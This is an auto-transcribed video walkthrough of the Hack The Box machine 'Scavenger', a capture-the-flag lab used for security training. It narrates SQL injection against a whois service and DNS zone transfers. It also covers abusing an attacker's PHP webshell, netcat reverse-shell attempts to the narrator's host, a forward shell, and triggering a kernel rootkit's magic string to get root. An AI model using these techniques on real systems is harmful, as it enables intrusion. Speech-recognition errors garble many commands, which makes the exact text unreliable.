 what's going on YouTube this apes I'm doing scavenger from hack the box which was a really tough box potentially an insane box if you're not good at doing recon just because there's so many steps to do and so many chains for instance the buck starts out doing an SQL injection against who is to get some DNS names use those DNS names against a DNS server to do a zone transfer to get subdomains you find out one of those websites had got popped you do a go bust John and find the attacker drop show PHP you fuzz that to find out how the attacker uses shell dot PHP to execute code you get on the box but there's an IP tables thing blocking reverse shells so you just kind of do commands here and there eventually find a rootkit reverse it and get root so that's a lot of steps which means if you're not get it documenting or taking the new information you got and applying it to the old things yeah known to see if it unlocked anything you're gonna have a lot of trouble trying to solve this box there's a piece in this video that I think I do a really bad job on so if you're taking notes definitely try to find ways to automate more things for a specific example whenever I get a new password I kind of just tried that password on the things I was looking at when I should have had some like Hydra Medusa scripts ready to go so whenever I got the new password I could quickly try it against all the users for FTP as a sage and a few websites and if I had done that I wouldn't have had to get a Ford shell on this box to do a su command because I could just FTP in as that user to download the kernel module I needed so with all that being said let's just jump into the box as always we starve it and maps are - I see four default scripts as V enumerate versions Oh a output all formats when the nmap directory and call it scavenger and then the IP address which is ten ten ten one fifty-five can take some time to run so I've already ran it looking at the results we have a ton of ports open so I'm going to just start off with a cherry tree so we can take notes as we go pressing control and to create a new node I'll call it scavenger make control-shift-n to create a child node and I'll just create something called interesting and the very first thing we have is port 20 is saying it is closed so nmap is saying there's something behaving differently about this port because not listing all the other ports that scan which is the top 10,000 ports because we didn't specify a port range so that's just the default so this one behaved not like all the others and my guess is there's an IP tables rule here rejecting packets so we can put this and do IP tables rejecting packets question mark and then the very next thing we have is vs FTP D running on port 21 and that's running 303 so I'm just gonna do search point against this to see if there's any known exploits and everything's for version 2 not version 3 so nothing there we can try a non miss login I bet nmap probably tried this but and that is not great at telling you all the scripts at ran so this is one I always just like doing to see if anything else gets leaked and while that goes I want to go over to Firefox and Scooby SFTP d30 3 I'm just gonna search for a change log to see if I can get some type of release date so looking at here don't really see a release I'm gonna see if I can find out when this page was created anonymous login has failed but if I do double you get on this URL and I can do exist tool on the page of downloads and we can see the file modification date time is on July 25th 2015 so be SFTP d30 3 release this watch mark grab VW get I'm sure if you did a lot more googling around you could find maybe a release note or something that specifies the exact date but it's probably not gonna be too beneficial to us to know that so why worry so I don't want to spend too much time there we have point 25 which is SMTP that's running exam SMTP D 4 8 9 and it's leaking the host name so let's do SMTP first name leak but that in and we can follow the same exact thing search point exam and looking through this we have a potential local remote command execution here I'm just gonna do search poit - X - look the server and see if there's a proof-of-concept code don't see anything this is just an advisory so I'm probably going to ignore that potential Prive esque /r c e and I put prea best first because we have privacy privacy privacy and all three of these look the same but I can probably move to the next thing which is going to be 43 and this is potentially who is and looking through this we do have who is saying it is Maria DB so looks like this may be running some type of SQL database by netcat - 10 10 10 155 on port 43 we can do the hostname that was leaked which was super set coasting htb and see if this is functioning so it is so we do get a return no real good information I put like a bunch of A's we get just it failing but since this is saying it is SQL I'm going to try putting a single quote see what happens and we do have a SQL injection it looks like you have an error in SQL syntax Maria DB so I'm just going to copy this and we'll go put this and paste there we go and didn't have a new line first and we could go dig down this but I always like finishing my numeration before I move on so even though it looks like that's SQL injection let's just go check everything else we do have a DNS open that is ISC bind that's running version 9 10 3 so let's just do whoops scroll down so we can see everything NS woke up server 10 10 10 155 and we can try looking up itself see where it says doesn't have anything so reverse lookup may not be working if we do one 27001 it just returns localhost we can paste the leaked toast name and see if we can do a zone transfer so if we exit this we can do dig axfr which is zone transfer paste the dns name we want and then at the dns server 10 10 10 155 and we can see a bunch of host names so dns is there and transferring it does work so that is good to know so copy this go here DNS zone transfer works and now we have a lot to enumerate when it comes to the website because we have 1 2 3 4 5 6 virtual hosts we have to do so I'm going to do VI Etsy host and let's add all these so I'm going to grab this copy and paste dub-dub-dub paste we got FTP male 1 NS 1 so FTP mail was at 1 men and s1 and who is I think was the final one there we go and I already have dub dub go there so we have quite a few host names we have to enumerate so let's go and take a look so going to 10 10 10 155 we have virtual host not available and I think 80 was an export it was so let's go and enumerate each of these so cat Etsy Hearst and copy this paste no config found we can copy superset coasting paste nothing dub dub dub paste and we get a web page so there's something there we can look at FTP and you may want to use like aqua tone or something for this but wasn't that many sites to go through manually so aqua tone is just like a program that's written go that uses Chrome and goes through a bunch of URLs and take screenshots but the only thing we have right now is super set hosting so we can go here it's going to do virtual host and we can label this one and then control you to look at the source code we see slash themes' I'm looking for something that states this is like WordPress or something don't really see anything we can try just going to slash wp-admin to see and that is a 404 so nothing there we do slash admin I can type my hand was off just a little bit nothing there so let's try go Buster and then move on to do that SQL injection so we'll do let's just make a directory for get Buster and then we can do go Buster - you this and is this PHP or whatnot let's just go to slash says PHP 7 + MySQL if we do index.html we get 404 if we do index dot PHP we get the page so we know it's running PHP so you can specify - X PHP - W for list users share word list dirt Buster directory list - three medium and - oh we'll call this go Buster - this - xur hug extension PHP got out that should be fun and it's tell this to go into directory mode and we failed what am i doing wrong oh it doesn't like having these slashes it copied the HTTP colon slash slash there we go so now go Buster's running on that domain and we can begin looking at the Whois data because there was a SQL injection there so as a reminder if we do NC 10 10 10 155 on port 43 and give it a single quote we get this you have an SQL error to the right of this so what it looks like we did was I think we injected here so what I'm going to do is put this and then tip sack and this will give us a better way idea of where we injected and it doesn't look like we inject it there we injected way back here so this is the one we injected so if we inject a single quote and then put a parenthesis and that comment we should be returned this query which let's go into Cherrytree so right now we have like select star from ape sack limit 1 and ipsec is where we're injecting so do is I want to get rid of it SEC and inject a single quote and then a comment so all this is removed for a single quote and then parenthesis and then a comment because if we only injected this piece and it's got a closed parenthesis here we know there's an open paren see here so we want to inject a single quote friend see and then comment so let's do single quote parenthesis comment and we don't get a SQL ear if I do this again and I don't do that parenthesis you can see we have a error message so the next thing we want to do is see how many columns this is returning and this will be handy for Union ejection so I'm going to do this and then order by one or one and then error let's try for two by two no error let's try order by three and unknown column three so one doesn't error because it can order by this two dozen error because it can order by that and the third one it's saying hey this select statement that you're doing only has two things so I can't order by it so if we go back here it's not select star it's probably like select ID or a probably first name IP address from will do who is database but who is where and this is where we inject so next thing to do is test Union to make sure we can get data so if we do Union select if SEC rocks and then comment we get upset back so we never see the second one but we always will see the first one so now we can try to extract stuff from information schema to find out what database were in and then the tables of that so let's do that the first step will be looking at the documentation of information schemas to see how it is handled so I'm just googling information schema and then we can go to this page and then the first one we want to do is called schemata schemata there we go and this table is going to be the one that contains all the database names so schema name that is a database so I'm going to do is Union select group can cat this will take multiple rows and put them on one line and I want to do schema name and then we always have to have two items in this Union so just comma two from information schema schemata and we can see two tables information schema and who is or two databases so SQL databases and we only really care about the Whois database so the next thing we want to do is get a list of tables so we can go back here and look at the probably tables table tables table there we go and if we look at this we have table schema so we can say select star from the tables table where a table schema equals who is so let's do that so Union select group concat and the table name so table name - from information schema tables where table schema is equal to two is looks good and we get customers so tables customer and only returned one so what I'm going to do is make sure we did this correctly so I'm just going to double check my work limit 1 comma 1 whoops didn't put a and comment Union select but this is it limit 1 oh yeah I need to have that where statement cuz I just now grabbed everything and this limit thing ignore I what I just did I don't have to do that because I'm doing group can cat everything's going to be just fine there's only one table in this so what I was doing because I think just stopping would probably confuse you I was thinking I didn't have this group can cat so I was trying to do Union select table name to from information schema dot tables if you do limit one will only get one thing but I have a typo right here and I don't have my arrow keys so NC 10 10 10 150 543 Union select table name - from information schema tables limit 1 so if we do this sent to date DNS well I'm just failing all over the place right now 43 there you go and we can do limit to 1 I think get the next one and then 3 1 2 get the 1 after this and just extract the tables one at a time but again if you do the group concat you get them all at once so it started off with all plugins character sets and we group can cat table name and do this do not copy the comma you can see it's kind of all and all plugins then applicable roles character sets it looks like there's a maximum number of characters this can do we do echo - and paste this WCC 1,024 so we can only extract 1,024 characters at a time but that's all this is so long that way to say there's only one table in this Whois database hopefully I didn't confuse anyone with that tangent and hopefully it helped let me know in the comments so I know if you enjoy when I try to explain when I make a mistake but the next thing we have to do is Union select group can cat and I'm just gonna say I know column name is in the table schema columns you can go back to the page here and go and look at that table if you want to see how to do it but cremation schema dot-coms where table name is equal to customers so if we do this we have three things we have ID domain and data so tables customer and we can put this so there we go it easier to read so now we have all that we can now select what data we want we probably don't care about ID the domain and data we probably don't care about but domain is what we want so let's do Union select group concat domain comma - from customers because we're probably already in the database when to specify we can specify if we want but we brought I don't have to who is got customers and we get three if we didn't specify because the code is probably using this database anyways you don't have to and if you want to see what database you're in we probably could have done the database command so Union select database - like that let me see we're in the Whois database already but we got a few new host names so domains column domains and paste this so we've already done a good job at a new Marine that super set coasting but let's go and do the other ones if you remember back from interesting we did have a DNS zone transfer so let's go and do a zone transfer in each of these so dig axfr paste we have to do at 10 10 10 155 and you got mail one and dub dub dub so let's do V Etsy DOS male 1 just on the blog now we can do dub dub dub and just another blog HT be let's get rid of these trailing periods male 1 just another blog HT be virtual here it's not available go to dub dub dub we get website under construction and then we just go to this nothing so virtual host unknown CMS just not the blog under construction and probably should run go buster against that but let's go finish our enumeration of all these domains so the next one we have is go back to Cherry Tree own hats h TB and same saying o Nats male 1 and dub dub dub so etsy host-based dub dub dub and male 1 I have to put a period here then go a numerate I don't headstart eh TB nothing male 1 dot pone s I used to be nothing dub dub dub and it looks like some type of store we look PrestaShop so go back here virtual host her hats htb PrestaShop i don't know any scanners or anything off that top my head for that so we're just going nord and finish our numeration because i hate always digging down rabbit holes before I'm done and numerating so the last domain is rent a hacker HT B so let's do that zone transfer and we have rent a hacker male 1 dub dub dub and sec OH 3 so Etsy host rent a hacker dub dub dub male 1 and sec OH 3 so let's do right - hacker nothing here male 1 nothing there dub dub dub and I mistyped that dub dub dub right - hacker we get a page by control you this it looks like there's a lot of broken things maybe if we f12 reload I'm not exact what's going here because I don't see a bunch of errors but this is definitely a wordpress page without any images being shown so if we go to slash wp-admin we can potentially login so we probably should run WP skin against this looking at the post there is a post run attacker and then the very last comment is saying hey check your bug tracker you have been owned and there is one last I mean we haven't looked at which was Seco three so rent a hacker htb see what this is and we get owned by the haxor team so the very first thing I want to do index dot PHP verify this is indeed a PHP thing and that actually goes to mantis so we have a login here so if we do virtual host we rent a hacker WordPress and then SEC oh three dot rent a hacker is mantis was pwned so this is running that and why the other page showed is probably HTML is preferred over PHP so if there's an index dot HTML that page gets displayed if it's PHP another page gets displayed so this one right now is what I'm most interested in and oh for three-foot PHP my admin is a cool that one's interesting but I'm gonna kill this one real quick the old go Buster on that one website it's not too helpful so spoiler let's just kill that and do SEC oh three dot renta hacker HDB and we will paste this nope HTTP set go three Renta hat code htb and the word list I don't want to wait around a whole lot I'm just gonna do small dot txt and that's T we'll save 50 threads and hopefully we don't kick over this server because I don't want to wait that much so looking at all the PHP files and there is one that sticks out and that is shell dot PHP so looking at shell dot PHP it's just a blank page so the very first thing I do is see if this is a shell I created and use the like comment if SEC or please subscribe and we don't get anything but showed up PHP is generally something attackers drop so if you wanted to see kind of when the server got popped you could do what we did before and do a double you get on this page potentially and we do exist tool show dot PHP it doesn't actually say anything because the page is dynamic we're not actually downloading shell dot PHP we're going to the web server it's executing something and then giving us output but there is an image where is it I just paste this oh we could do long index.html so if we do double you get this index dot HTML exists tool index HTML this site was popped back in December of 2018 so let's put this under interesting I'm gonna rename this where as rename I'm gonna press f5 no f2 there we go f2 interesting we'll call this and that boots I want to do ctrl shift and interesting interesting server popped and we'll put the timestamp always good to have this type of stuff for like an instant response W get of index.html so we have that the next thing to do probably is to figure out exactly what she'll be HP is because when a lot of attackers put shells on servers they don't really do the best job at securing them so it's probably just a get or post parameter that you can just put a variable and then a command and it executes so let's go and hunt for that with W fuzz the parameters we're going to use is probably going to be a abbreviated word list just because I don't feel like it taking a while I'm gonna go use a share SEC list if you don't have this you can app install SEC list to install it and then I'm going to find grep - I / AM and I see there is a discovery web content parameter names so I'm just going to try this one first so we can go back to a WS command dude - W for word list user share SEC lists and then discovery web content but parameter names and then specify HTTP second three RN - hacker HT b / l dot PHP question mark fuzz equals or do ID and we have to hide everything that we don't want so we can do - - h w4 hide words that are equal to zero length and hopefully ID returns one thing which it looks like it does we do have hidden so if I go back to my web browser we can go to shell PHP question mark it in equals ID and we see it did return something so this looks like it is going to be the command we do Who am I I be one c03 so I can do Bosch see like this Bosch - I reverse shell cheat sheet I'm drawing a blank at the Bosch one-liner so pull it from here go back here and let's do port 9000 110 1014 - I think is my IP if config tun 0 it is n CL v NP 9001 and when will you run this we don't get anything so I'm going to try is which curl we don't have curl in the box which W get we do do we have NC because then see you do better we do have NC so NC 10 10 14 - on point 9001 and we don't get anything so it looks like there is some type of firewall or something preventing us from reaching back I'm gonna look at the hostname IB 0 1 I'm gonna do LS LA on slash to see if I see like a dot docker directory to see if I'm in some type of virtual environment I'm gonna do find Etsy grep IP table and we do see IP table rules a common way to bypass the outbound rule of firewall is do ipv6 so let's see what these will look like so I'm gonna cat pet see IP tables rules v6 and we see the default output is set to drop and there's no real except below so these sakes is not going to work for us looking at the v4 rules we can see quite a bit default rule for input is drop and output is job so since the default for output is draw if we go down here we have state-established - just accept whenever it sends a syn packet outbound is going to get dropped but that works because if we're trying to get to a web server the web server is not gonna send a syn outbound it's going to send a I think syn ACK all right Mac sends another packet outbound and that's why this works so unless the packet comes in through one of these accepted ports it's not going to be allowed back out so we could do a forward shell which we'll probably do in a bit but we can still enumerate the Box a little bit to see what's going on so looking at this we see any rule help out output PTZ peed-on source port 20 and if you look at netcat we do have a source port option so - B so we can probably specify the source port so what I'm going to do is listen on port 80 because I want to make sure like if by some weird thing I'm accepted as possible or as accepted as possible so I'm gonna do that not that it matters so it shouldn't matter but just in case it does what we do NC - P 20 10 10 10 10 10 14 - on port 80 and see if we get a connection we don't and I think the reason here is even when you're doing a source port set anything below 1,024 is privileged which means we need B root to do this and since we're not root we can't set a source port below 1,024 so that's a bust the other thing we can probably look at here is the home directory so if we do find that there looks to be nothing in here we do fine slash home quite a bit of files here so what I want to do is see what the attacker did on the box so we do have the date of potential ownage which is December 6 2018 so let's look from December 5th to December 15th let's look at every file within 10 days so let's see what the attacker did so we'll do let's do this over and curl just so it's a bit easier so curl does this work or will I have to your line code I have to URL encode so I'll type it here and then we'll paste it in Firefox so we'll do find / - newer MT 2018 12:05 and not newer MT 2018 1215 and I'll add a - LS so we can see the file dates to make sure we did this correctly so paste hope I want to view the source December 7th 10th looking like we got everything we want we don't want to see directories so what I'm going to do is I'm going to add dash type F I'm also going to add dash readable to only say things that we can read because I'm not interested in a file if I can't read it so let's try this we'll probably have to view the source do not like that command oh I got rid of the slash no I didn't maybe - readable doesn't like oh I had to slash up here it needs to be there there we go placement does matter when you do commands from this let's get to the source so we can read it more cleanly and now we have a list of what's happening on the server around this time so we do have a bash history but it's set to zero size so we don't really care about that and we can't read that file readable I guess I got rid of that there we go so all this Python stuff we'd probably care about this if we're actually doing instant response to make sure they didn't put a backdoor at any of the files but for us yeah who cares Grubb again probably not too important but looking at shell dot PHP that was created on December 10th index dot HTML was created December 6 so it's odd that they defaced the page before they drop the shell so what I'm going to do is well just do it by the 10th because a real hacker would probably drop the shell dot PHP then defaced the page so let's see I'm just shrinking the number of things we have to go through that's why I did that so WordPress config so let's go see what this is we're press configs generally have a password so let's paste and cat it so I just a cat home whatever Doug config and then control you to view the source we do have DB user and a password so she'll notes DP config IBC r3 and this password do we have SSH open SSH 10 10 10 155 we do so IB 0 1 Co 3 at this we can try copying this paste doesn't work we can FTP IB 0 1 c 0 3 @ 10 10 10 155 so now how you do ftp IB 0 1 C 0 3 paste the password login successful we do dir we do have some stuff bash history which is nothing would press archive sector 3 so we do 2nd 3 we can potentially get more config files but doesn't look like we have all that much here's the WordPress well we're just at and oh we can go up a directory so let's see we can go into this FTP directory no we can't because that's a group and we are not 1000 so but we can download pretty much any file off the server we could already do that with this and let's look at who we are actually are we the same exact user only am i yes so it doesn't really get us anything what is interesting is that's a valid password for that user however he's not allowed SSH so let's go back and enumerate things config we got mail on December 10th so we can cat this so cat the mail and let's see from support we need your help or sight spin to face what do we do looks like there's some instant response going here they just made a backup of the Apache logs on FTP superset coasting with these creds so let's copy these into cherry tree email okay and I know it's tempting to go dig into that now but let's just go finish looking at the logs we can read var log fail log so what is this showing that's just a binary we have to parse it and it's C passwd so maybe the attacker actually modified a account because passwd is changed so let's go cat this and we can see all the users we kind of had these users from when we were FTP on the box and went up a few directories but we can copy this and put users here and we have owned that guy actually I will just put in bold if I have owned it and we may have owned FTP let's go try logging into this so FTP 10 10 10 155 and then I b01 FTP paste the password dir d IJ so incidence and let's see there are two directories so IB 0 1 C 0 1 there's three files dir IB 0 1 C 0 3 nothing there we can do - a a CDI be 0 1 C 0 3 dir - a the list hidden files don't get anything don't know I just exited ib0 one FTP paste incidents CDI v01 C 0 1 I'm just gonna do em get starter to download everything hit YES on each one and let's go through these files I'm going to make the FTP MV IB 2 FTP and we can move notes here as well don't know what this file is I created it somewhere but so I'll get notes after checking the Long's and network captures all signs point to the attacker knows valid credentials and abused recently discovered valen to gain access to the server so let's go take a look at access log and at the end of this video we're going to use Zeke which is known as bro to parse this pcap and kind of build this ourselves but if you don't have tools available we're gonna do it without tools first and then the end of video we'll do it with tools so the first thing I want to do is look at all the IP addresses so I'm just gonna do awk print one and it's game VIPs so it - you we only have one IP in this access log so that's not helpful the next thing I want to do is look at all the user agents so we'll do hawk - f escape a single quote and I'm gonna guess seven and we're gonna see where I'm at let's try eight six there we go six so all that was doing was by cat this log file again it's counting all these and using double quotes as delimiter this happens to be the six double quote which is why we got the user agent so we can do sort unique - see - countdown and it looks like I would guess this one's the malicious one or maybe seeing Linux and user agents malicious as well but it's easier to look at all the lines with Mozilla 4.0 because they're seven lines versus 36 so let's start with that one so if I grep from Mozilla 4.0 and do less we see this it's not kind of pretty if I do less - capital asked to disable line wrapping it's a bit easier because I can just do left and right so getting to the page and then making a post request and then getting index controller and looks like he's executing something so they definitely exploited pen hats htb which is odd why they said the bug tracker in that WordPress comment because this is not related to that but let's just go into the Wireshark and search for this string to see exactly what this post request is so if we go back to a terminal Wireshark on FTP ib0 one incident pcap and then i'm going to ctrl f i'm going to search for the string this near and wide is fine and packet bytes so here we go i got a post we follow tcp stream we do have a login so token controller admin past obd get you a hat and then percent 21 I believe that is your encoded to a exclamation point so creds get you a hat exclamation point and email is pone hats at Powhatan htb so what we could do is try to go to a parent hat h-2b and go to this directory and see if these people have changed the credentials yet that's a chibi because we're supposed to be helping them and is it response case so always good to test it when you see the attackers used to credentials that those credentials are no longer valid it doesn't look like it's valid let's go here they did it get here let's just do it get there and it looks like this directory may not even be valid anymore sign in her own hats at prounounced out HDPE and then the password get you a hat doesn't work you can also try the Renta echo login page PHP turn hats at I already have that then get you a hat exclamation point so there's nothing really here so let's go back to the P cap another thing I'd like to do is extracting objects HTTP and we can see all the file names here and we could just reconstruct the pages to see exactly what they look like but we do see something interesting we got route C and make file so I'm going to save these so let's do route C and make file because it looks like two files are loaded and rootsy sounds really interesting so let's do-si-do less makefile and it's looking like it's making something but we can do them rootsy and start looking at the code so we got device name tty r0 and we can go back to a way of executing code and we can say like find slash dev grep TTY and there's a lot of them but tty r0 is a device so looking like we have a kernel rootkit just going down we do see magic data is got root and then we have if data data exists copy from user so it's copying to the data variable and it's copying what's in the buffer and the length and that's doing a comparison on data so what it got and the magic which is got root and this is the length so if these are the same there's going to rewrite our credential structure which we've done this in another box actually I forget which one if I do if SEC rocks we search for cred No Smasher - is I think what we did it yeah redirect credentials of memory so we did something similar and smash her - but it's saying if got root is this door if we send TTY or 0 got root is going to edit or credential structure and give us root so what we can try doing let's first see exactly how they said got root G 0 or 0 so we can go back here echo g 0t r 0o t - dev tty r 0 semicolon who am i and we are still the same user so that didn't work I guess the next logical step is to try to get a shell on this box and I'm going to do it with a Ford shell and I finally made the code public I've done in previous videos again if you go to epic dot rocks and search for like Ford shell you'll probably see me use this in a few boxes I first created it and so car but I've used it several times since then but github.com / ape sack there should be a Ford Shale repository there it is so this will be the code I use so CD up Ford shell and let's modify this so let's see we want the proxy ashore let's say that burp suite let's load in the Community Edition what if I had Pro I guess I updated Cali and then it overrode it's fine next okay so we have to modify the URL so we do 10 10 10 115 and it is shelled PHP type out the IP address here and if you're unfamiliar with this script I'd highly recommend watching that Surikov video because I explain everything about the Ford shell essentially we can't get a reverse shell over the network so we write a shell to the local hard drive or memory and use files as input output so we can get a persistent shell without requiring a network connection so that's what this does let's see next thing we have to do is the next modify this and this was using shell shock we're not using shell shock we're now using an HTTP parameter so the parameters cord hidden and the header that is going to be params for a get parameter and we can do prams is equal to params and that should be it so let's save this Python 3 ford shell payload reference before assignment what line 55 I'm not sure what I was doing here but that should just be equals 4 4 not found oh we have to do domain name so SEC oh three dot rent hacker htb looks good LS and we get a bunch of output awesome so now we have a Ford Shale I'm going to do PWD CD dot dot LS and it is now persistent so we're going to do Who am I and I'm going to do echo was it how it was get route spelled let's see let's go here then route see G 0 TR 0 0 T so for G 0 T 0 T like that to dev TTY or 0 Who am I and we are still this user so let's do su - and try switching to various users that we have the password to because maybe have to be a specific user so let's see where are my passwords pie shell nodes we have this user let's try password for everything get you a hat so cat all we want to get at see pastor BD because we already have it here let's do I be a 1 C 0 2 su I be a 1 C 0 2 I have to do upgrade and there's going to do the Python - C and put PTY thing su - Ivo 1 C 0 to ask if the password put the password in authentication failure cat Etsy passwd my missing one is there a C 0 1 there is su - I be a 1 C 0 1 get you a hat we do ID we're now this user so let's try that get got root again so echo gz o T or 0 T - dev TTY or 0 ID still this user see we do have accesstext presses up user die Texan dub-dub-dub but there is a directory with three periods so let's try going into that directory PWD did we do it we did and there is a file called root K L so base 64 - w0 root K L that is a big file see I don't want to grab that so you don't know my team Oakes is big enough and it is so we can grab this whole root ko file and then let's go back here V root ka b 64 paste it it's going to take a second pase cuz that was quite a few characters come one team ox there we go finally pasted delete that there was just a blank line to top the file base64 - D root ko that - root KL file root ko and we got an elf so now we can load this up into Dedra and the logic I'm doing now is kind of comparing the root ko that we have which is a compiled kernel module to the source code to see if there's any differences so let's do new project non-shared chore this one's going to be scavenger i'm Qadir goodra sure open the decompiler let's do file is it open now import file that's it up one directory scavenger root ko okay also sang analyze sure let's select all so right now I'm just waiting for this bottom right thing to learn longer be importing anything and then we'll go and begin taking a look at this so now that it's done we can go over to the functions and look at everything here there are three functions rude open root read and root right and I'm going to go back to the code which was at root see we have it open here and we do have our got root thing that is in the root right function and there's also read open and everything so this is definitely the same exact code we're not same exact but similar projects so let's look at root right because this is where the got root was and we see the memory compare whoops do not mean to double click that let's go back here we see the memory compare and your gauge we probably looks down with in mind because you have the hex and stuff side-by-side because I'm doing the video on one of the font bigger I have them in two different panes so here's the mem compare and it looks like it's grabbing local 28 and s1 s1 is copy from user if you go back here copy from user was the data what was being sent we want the other one which is local 28 will go 28 using printf to combine 31 and 2d if we look at 31 and 2d we just have hex if you highlight and let it sit it shows it is the character g3t and if you had highlighted this and looked at code well I guess we can say convert to character sequence and we can do this one right click convert character sequence get and Prive so we know this is g3t and this is priv I don't know why that's not maybe we can retype you are now care yeah built-in type sure I'm not actually sure how to tell the decompiler to show the ASCII form but that's get root so we can rename g3t oh this is prettier IV right yeah po1 V so let's rename this one to Pier 1 v there we go that seems a bit easier so we'll call 28th there's going to be from the user oh no this is magic so and then s1 is going to be data there we go so now it's comparing data and magic and magic is get Prive so let's go back to a Python code PWD we're still running echo G 3 TP r 1 V 2 dev TTY or 0 ID we're now route so that is the box I hope you guys enjoyed it and we can try a few things first we did echo got route let's try G 3 T P R 1 V and with that we can get rude here so with a root shell let's do NC 1010 14 to 480 and we still have net cat listening here so enter we can't get to it so all I was doing here was making sure that root just wasn't blindly allowed out of the firewall so now I'm gonna do - P 20 to see if not being root is what stopped us from doing this source port and we get a connection there we go I guess I had a special key hit and it just switched off but that's why we can it do netcat earlier so the other two things I want to do is the very end of the video we're going to use Zeke to do the pcap the first thing I want to do is kind of write some middleware for this SQL injection so if you didn't want to go through that information schema thing you could have used SQL map to actually do this and I think I have a directory saved no I don't okay I wasn't sure if I had done this before so what I mean by that is SQL map can't do the SQL injection because SQL map knows HTTP and the SQL injection is over who is so if we make a PHP script that will connect to the Whois and run whatever command SQL map does it'll work so again all we're doing is running SQL map sending it to our PHP script which then sends it to the Whois database which then sends it to Maria DB which is MySQL so this is going to be what we do so let's do V please subscribe PHP and we'll begin writing our PHP code that is intentionally vulnerable we can SQL map a Whois database so the first thing I'm going to do is just send it to localhost that way I can test things out so the next command is port and we'll do 43 now we got to create our socket so we can do socket underscore create a fi net sock stream and then TCP okay sup cadet is equal to some connect socket address and port okay then we can do request is equal to URL decode and we want to put request please subscribe so I'm doing a URL decode because we don't want to send URL encoded information to our server so actually we can comment this out and show you first the quest please subscribe so we'll show you for us exactly what that does so now we got to write the socket so sock it right sock request and I don't know I have a quote here okay that's the function and we need the length of the request okay now we go to echo the socket read sock 2024 and PHP socket read just two modes one does read until a line break and the other will read all we're going to do PHP binary read yeah we probably won't have to specify this if I just did normal read it stops at a line break which would be bad for us I guess we can show what that shirt looks like first now it's normal read or a mole read so this is going to be bad and break at line breaks forgot the semi quote semicolon and then let's suck it clothes suck okay now let's test the web server so PHP - s 127 zero zero one port 80 and is just like Python simple HTTP server except it will actually execute code so if we curl one 27001 please subscribe PHP and we also have to listen on port 43 and we called it please subscribe is equal to ABC let's see we have a syntax error line 9 line 9 like that there we go paste the same thing in connect line 7-7 socket there we go function name a must be in string so let's see what did we send socket right request snap parentheses send it and we wrote ABC so if we did your rule encoding like percent 20 ABC and send this oh we may not actually have to your LD code I think it does that for us so we'll send it oh so now it's doing the whole it'll say stuff until I hit enter and then it prints that but if we change this the wind dub dub dub so if we change normal read to fine air you read it should read until null byte or something where we close the socket so do this one if I sent it all at once yeah well at a point can actually just play with it so we know we sent data we can now change this from localhost to 10 10 10 1 55 only no long oh no we do have to host that still ok so no one have to host or netcat session so cool test single quote escape let's try putting this in web browser so test single quote it's not hitting the please subscribe dot php' just hanging oh I probably know what it is request this plus period i think period in PHP is concatenate backslash n backslash n so we need to send a line break to the actual who weighs server I bet that's it there we go so now we did this curl and we got this error message let's see what happens if we change the thing into a normal read normal read you'll just get the last line which is Maria DB so you want this to definitely be binary read and there you have it so now what's left SQL map - - technique equals U for union we only want to Union injections - - DBMS we know this is my sequel I'm just doing this to speed it up and then your URL is going to be - u HTTP 1 2700 180 let's specify that please subscribe dot PHP please subscribe is equal to support me on patreon and the parameter with - P we want to inject into please subscribe so it's testing and you can see everything SQL map is doing get parameter subscribe is Union injectable yes and now it is confirmed so we can do - - dump and escrow map didn't like something but it's saying potentially trimmed output but you can see it's definitely dumping the data where is it domain name that is so supers that care staying just another blog the next one is pone hats so we are definitely dumping data I'm not sure why SQL map is thinking it is truncated but you can see it got all the domains I guess we could try doing what it says the - - no cast and this is a good way to identify exactly what SQL map does if you do like - - hex you can see all the commands SQL map is doing to do this but that'll be it for the SQL map portion the middleware and finally we're gonna get into Zeke which used to be called bro and it's a super good packet analyzer the downside to this whole section I'm not a Zeke expert I'm used to it being installed on like rockin sm or security onion and using it from there so putting it on Kali is definitely not what I'm used to so the first thing it wants us to do is install this I'm going to do app to install and let this install while we're talking so the next thing we'll have to do is go to the downloads page to download it and I had mixed results trying to get the pre-built packages working on Kali so that's why I'm doing it this way with the source code so download it is currently downloading and we are currently setting it so essentially what Zeke will do it will go into this peak app and split it into a bunch of files it will be like an SSL file an HTTP file a connection file and then it will have options like Zeke - cut so we can easily just see the data we're interested in saying so this should be a fun exercise and that is now downloaded and apt is done doing it at the same time what a coincidence so move downloads Zeke to here and then Terzi xvf Zeke and go in dot slash configure and we can start closing things we don't need Wireshark we don't need this forward shell exit so that's done we can do make to make it and this is what takes forever so I'm going to pause the video it probably take like 15 to 20 minutes to do this step and then when it's done we'll be able to install Zeke and start playing with it so about 50 minutes later this has now finished installing so we can run make install to copy Zeke and all the locations it needs to be in and once this is done we should be able just to use the program so I'm gonna make two pcap I'm gonna go in here and if we do Zeke - H it's not found yet it's still running oh it gets installed in like LS use a local been Zeke I think or use a local Zeke bin so this is where it gets actually installed so we can export path is equal to user local bin Zeek and then path if you wanted to you can edit your like batch or C file to put that command somewhere to always have this in your path but now you can run echo path user local I think it's Zeke been my bed there we go so now we can use Zeke to read a pcap file I always do the - capital C to do no checksums if you don't do that and you see this error message I'll show you what - R is read file for a peek app so I be innocent pcap we see an error message saying something around bad check sums and if you do LS will do don't see - L on HTTP dot log only 23 lines if you do the - capital R actually let's remove all the files redo this but - capital C naught r CC - L HTTP log 55 so always do the ignore check sums so looking at these actual files that it created if you do West - capital s we have this and s is the don't do word wrapping if you don't it looks ugly so highly recommend using - capital s when viewing this and you can see all the information it spews out so you got timestamp the yo-yo ID or UID ID dot originating host ID originating port ID response host ID response port and we see some four four four four so this is probably some type of meterpreter attempt so we see 10021 - - and this is definitely probably the server if we go and grab one of these unique identifiers and this grep that on the HTTP log we see that exists so chances are the responding will host is going to be the server also the port is set to 80 if we grab one of these requests the ones that have the server going to 1002 19 on port 4 4 4 4 the default from interpreter let's see what we see nothing so right off the bat we see something fishy and SSL right now so that's probably going to do a meterpreter SSL connection but if you want to sort these differently like if you wanted to see all the responding ports you can just cat comm log do Zeke - cut and then paste whatever you want and it will automatically filter it for you so unlike before when we did that access log and had - all can kind of count this is all and words which is easy so you can do sort - you unique dots see to get some stat but not sort - you sort unique - see to kind of get some stats but that's cool let's look at HTTP and we can see again timestamp UID what not but this one has like method you got host you got URI the referrer and user agent so let's look at all the refers in this real quick so if we just do cat HTTP Z cut sort unique - see we can see all the sites that have referrals nothing too interesting there so let's see what could we do let's add some things together so let's do ID originating host so let's put this so ID Ridge host and see what else there is we want let's - a speak at HTTP let's see you got the host the URI and user agent West - yes and we have a pretty thing to see a bunch of information so there's this web server hosting make file and root dot C and it's using W get but definitely makes life super easy now the downside to this is right off the bat it didn't have the module to do 